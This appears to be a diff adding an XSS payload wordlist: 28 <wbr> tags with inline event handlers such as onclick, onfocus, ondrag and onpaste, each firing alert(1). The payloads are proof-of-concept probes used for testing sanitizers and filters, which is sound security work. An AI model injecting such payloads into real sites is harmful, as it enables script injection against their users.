@@ -1,0 +1,28 @@
+<wbr draggable="true" ondrag="alert(1)">test</wbr>
+<wbr draggable="true" ondragend="alert(1)">test</wbr>
+<wbr draggable="true" ondragenter="alert(1)">test</wbr>
+<wbr draggable="true" ondragleave="alert(1)">test</wbr>
+<wbr draggable="true" ondragstart="alert(1)">test</wbr>
+<wbr id=x tabindex=1 onactivate=alert(1)></wbr>
+<wbr id=x tabindex=1 onbeforeactivate=alert(1)></wbr>
+<wbr id=x tabindex=1 onfocus=alert(1)></wbr>
+<wbr id=x tabindex=1 onfocusin=alert(1)></wbr>
+<wbr onbeforecopy="alert(1)" contenteditable>test</wbr>
+<wbr onbeforecut="alert(1)" contenteditable>test</wbr>
+<wbr onbeforepaste="alert(1)" contenteditable>test</wbr>
+<wbr onclick="alert(1)">test</wbr>
+<wbr oncontextmenu="alert(1)">test</wbr>
+<wbr oncopy="alert(1)" contenteditable>test</wbr>
+<wbr oncut="alert(1)" contenteditable>test</wbr>
+<wbr ondblclick="alert(1)">test</wbr>
+<wbr onkeydown="alert(1)" contenteditable>test</wbr>
+<wbr onkeypress="alert(1)" contenteditable>test</wbr>
+<wbr onkeyup="alert(1)" contenteditable>test</wbr>
+<wbr onmousedown="alert(1)">test</wbr>
+<wbr onmouseenter="alert(1)">test</wbr>
+<wbr onmouseleave="alert(1)">test</wbr>
+<wbr onmousemove="alert(1)">test</wbr>
+<wbr onmouseout="alert(1)">test</wbr>
+<wbr onmouseover="alert(1)">test</wbr>
+<wbr onmouseup="alert(1)">test</wbr>
+<wbr onpaste="alert(1)" contenteditable>test</wbr>
